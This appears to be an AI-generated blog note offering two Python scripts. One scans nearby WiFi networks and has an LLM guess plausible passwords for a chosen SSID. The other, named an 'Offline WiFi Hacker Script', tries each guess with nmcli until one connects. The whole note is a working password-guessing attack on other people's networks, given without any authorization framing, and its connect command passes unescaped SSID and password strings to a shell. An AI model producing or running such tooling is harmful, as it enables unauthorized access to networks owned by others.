---
audio: false
generated: true
image: false
lang: en
layout: post
model: x-ai/grok-4-fast
title: WiFi Password Generator Script
translated: false
type: note
---

```python
#!/usr/bin/env python3
"""
WiFi Password Generator Script
Scans WiFi networks, lets user select one, generates suggested passwords using LLM, and saves to @tmp dir.
This script requires online access for LLM. Use a separate offline script to attempt connections with saved passwords.
"""

import os
import sys
from get_wifi_list import get_wifi_list
from openrouter_client import call_openrouter_api

# Ensure @tmp directory exists
TMP_DIR = '@tmp'
os.makedirs(TMP_DIR, exist_ok=True)

def parse_wifi_list(wifi_output):
    """
    Parse the output from get_wifi_list to extract SSIDs and details.
    Returns a list of dicts with 'index', 'ssid', 'full_line'.
    """
    networks = []
    lines = wifi_output.split('\n')
    current_ssid = None
    for i, line in enumerate(lines):
        if line.startswith('SSID: '):
            # Extract SSID from the line
            ssid_part = line.split('SSID: ')[1].split(',')[0].strip()
            current_ssid = ssid_part
            networks.append({
                'index': len(networks) + 1,
                'ssid': current_ssid,
                'full_line': line
            })
        elif current_ssid and line.strip().startswith('  '):
            # Append additional info to the last network if it's a sub-line
            networks[-1]['full_line'] += '\n' + line
    return networks

def generate_password_suggestions(ssid, num_suggestions=10, model="deepseek-v3.2"):
    """
    Use OpenRouter LLM to generate suggested passwords for the given SSID.
    """
    prompt = f"Suggest {num_suggestions} possible passwords for a WiFi network named '{ssid}'. Make them plausible based on common patterns, the name, or defaults. List them numbered, one per line, no explanations."
    try:
        response = call_openrouter_api(prompt, model=model)
        # Clean up response to extract just the list
        lines = [line.strip() for line in response.split('\n') if line.strip() and line[0].isdigit()]
        passwords = [line.split('.', 1)[1].strip() if '.' in line else line for line in lines[:num_suggestions]]
        return passwords
    except Exception as e:
        print(f"Error generating passwords: {e}")
        return []

def save_passwords_to_file(ssid, passwords):
    """
    Save the list of passwords to a file in @tmp dir.
    """
    filename = os.path.join(TMP_DIR, f"{ssid.replace(' ', '_')}_passwords.txt")
    with open(filename, 'w') as f:
        for pwd in passwords:
            f.write(f"{pwd}\n")
    print(f"Passwords saved to: {filename}")
    return filename

def main():
    print("=== WiFi Password Generator ===")
    print()

    # Get WiFi list
    print("Scanning for available WiFi networks...")
    wifi_output = get_wifi_list()
    print("Available WiFi Networks:")
    if wifi_output.startswith("No WiFi"):
        print(f"  {wifi_output}")
        sys.exit(1)

    # Parse and display numbered list
    networks = parse_wifi_list(wifi_output)
    if not networks:
        print("No networks found.")
        sys.exit(1)

    for net in networks:
        print(f"{net['index']}. {net['full_line']}")

    # User input
    try:
        choice = int(input(f"\nSelect a network (1-{len(networks)}): "))
        if 1 <= choice <= len(networks):
            selected = networks[choice - 1]
            ssid = selected['ssid']
            print(f"\nSelected: {ssid}")
        else:
            print("Invalid choice.")
            sys.exit(1)
    except ValueError:
        print("Invalid input.")
        sys.exit(1)

    # Generate passwords
    print(f"\nGenerating {10} password suggestions for '{ssid}'...")
    passwords = generate_password_suggestions(ssid)

    if passwords:
        print("Suggested passwords:")
        for i, pwd in enumerate(passwords, 1):
            print(f"{i}. {pwd}")
        # Save to file
        save_passwords_to_file(ssid, passwords)
    else:
        print("Failed to generate passwords.")

    print("\nUse a separate offline script to read this file and attempt connections.")

if __name__ == "__main__":
    main()
```

For the offline hacking script (e.g., `offline_hack_wifi.py`), you can create it separately to read the passwords from `@tmp/{ssid}_passwords.txt` and attempt to connect using tools like `nmcli` or `wpa_supplicant`. Here's a basic skeleton:

```python
#!/usr/bin/env python3
"""
Offline WiFi Hacker Script
Reads saved passwords and attempts to connect to the selected WiFi offline.
"""

import os
import subprocess
import sys

TMP_DIR = '@tmp'

def attempt_connect(ssid, password):
    """
    Attempt to connect to WiFi using nmcli (or fallback).
    """
    cmd = f"nmcli device wifi connect '{ssid}' password '{password}'"
    try:
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        if result.returncode == 0:
            print(f"Success with password: {password}")
            return True
        else:
            print(f"Failed with password: {password}")
            return False
    except Exception as e:
        print(f"Error attempting connect: {e}")
        return False

def main():
    ssid_file = input("Enter the SSID or full filename in @tmp (e.g., MyWiFi_passwords.txt): ").strip()
    filepath = os.path.join(TMP_DIR, ssid_file)

    if not os.path.exists(filepath):
        print("File not found.")
        sys.exit(1)

    ssid = ssid_file.replace('_passwords.txt', '').replace('_', ' ')
    print(f"Attempting to connect to '{ssid}'...")

    with open(filepath, 'r') as f:
        passwords = [line.strip() for line in f if line.strip()]

    for pwd in passwords:
        if attempt_connect(ssid, pwd):
            break
    else:
        print("All passwords failed.")

if __name__ == "__main__":
    main()
```
